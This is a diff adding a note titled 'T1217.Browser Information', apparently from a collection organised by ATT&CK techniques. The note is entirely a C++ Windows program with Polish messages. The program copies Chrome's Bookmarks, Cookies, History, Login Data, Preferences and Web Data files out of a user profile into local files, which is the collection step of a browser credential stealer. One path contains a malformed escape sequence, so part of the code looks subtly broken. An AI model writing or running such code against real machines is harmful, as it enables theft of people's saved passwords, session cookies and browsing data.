@@ -1,0 +1,139 @@
+---
+title: "T1217.Browser Information"
+folder: "09. Discovery"
+---
+
+
+
+
+
+#include <windows.h>
+#include <fstream>
+#include <iostream>
+
+
+bool Bookmarks() {
+    std::ifstream src("C:\\Users\\User\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Bookmarks", std::ios::binary);
+    std::ofstream dest("1-6_Bookmarks", std::ios::binary);
+
+    if (!src.is_open() || !dest.is_open()) {
+        std::cerr << "Nie można otworzyć pliku do kopiowania.\n";
+        return false;
+    }
+
+    dest << src.rdbuf();
+
+    if (src.fail() || dest.fail()) {
+        std::cerr << "Błąd podczas kopiowania pliku.\n";
+        return false;
+    }
+
+    std::cout << "Plik został pomyślnie skopiowany.\n";
+    return true;
+}
+bool Cookies() {
+    std::ifstream src("C:\\Users\\User\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\\Network\\Cookies", std::ios::binary);
+    std::ofstream dest("2-6_Cookies", std::ios::binary);
+
+    if (!src.is_open() || !dest.is_open()) {
+        std::cerr << "Nie można otworzyć pliku do kopiowania.\n";
+        return false;
+    }
+
+    dest << src.rdbuf();
+
+    if (src.fail() || dest.fail()) {
+        std::cerr << "Błąd podczas kopiowania pliku.\n";
+        return false;
+    }
+
+    std::cout << "Plik został pomyślnie skopiowany.\n";
+    return true;
+}
+bool History() {
+    std::ifstream src("C:\\Users\\User\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History", std::ios::binary);
+    std::ofstream dest("3-6_History", std::ios::binary);
+
+    if (!src.is_open() || !dest.is_open()) {
+        std::cerr << "Nie można otworzyć pliku do kopiowania.\n";
+        return false;
+    }
+
+    dest << src.rdbuf();
+
+    if (src.fail() || dest.fail()) {
+        std::cerr << "Błąd podczas kopiowania pliku.\n";
+        return false;
+    }
+
+    std::cout << "Plik został pomyślnie skopiowany.\n";
+    return true;
+}
+bool LoginData() {
+    std::ifstream src("C:\\Users\\User\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", std::ios::binary);
+    std::ofstream dest("4-6_LoginData", std::ios::binary);
+
+    if (!src.is_open() || !dest.is_open()) {
+        std::cerr << "Nie można otworzyć pliku do kopiowania.\n";
+        return false;
+    }
+
+    dest << src.rdbuf();
+
+    if (src.fail() || dest.fail()) {
+        std::cerr << "Błąd podczas kopiowania pliku.\n";
+        return false;
+    }
+
+    std::cout << "Plik został pomyślnie skopiowany.\n";
+    return true;
+}
+bool Preferences() {
+    std::ifstream src("C:\\Users\\User\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Preferences", std::ios::binary);
+    std::ofstream dest("5-6_Preferences", std::ios::binary);
+
+    if (!src.is_open() || !dest.is_open()) {
+        std::cerr << "Nie można otworzyć pliku do kopiowania.\n";
+        return false;
+    }
+
+    dest << src.rdbuf();
+
+    if (src.fail() || dest.fail()) {
+        std::cerr << "Błąd podczas kopiowania pliku.\n";
+        return false;
+    }
+
+    std::cout << "Plik został pomyślnie skopiowany.\n";
+    return true;
+}
+bool WebData() {
+    std::ifstream src("C:\\Users\\User\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Web Data", std::ios::binary);
+    std::ofstream dest("6-6_WebData", std::ios::binary);
+
+    if (!src.is_open() || !dest.is_open()) {
+        std::cerr << "Nie można otworzyć pliku do kopiowania.\n";
+        return false;
+    }
+
+    dest << src.rdbuf();
+
+    if (src.fail() || dest.fail()) {
+        std::cerr << "Błąd podczas kopiowania pliku.\n";
+        return false;
+    }
+
+    std::cout << "Plik został pomyślnie skopiowany.\n";
+    return true;
+}
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+
+    Bookmarks();
+    Cookies();
+    History();
+    LoginData();
+    Preferences();
+    WebData();
+    return 0;
+}
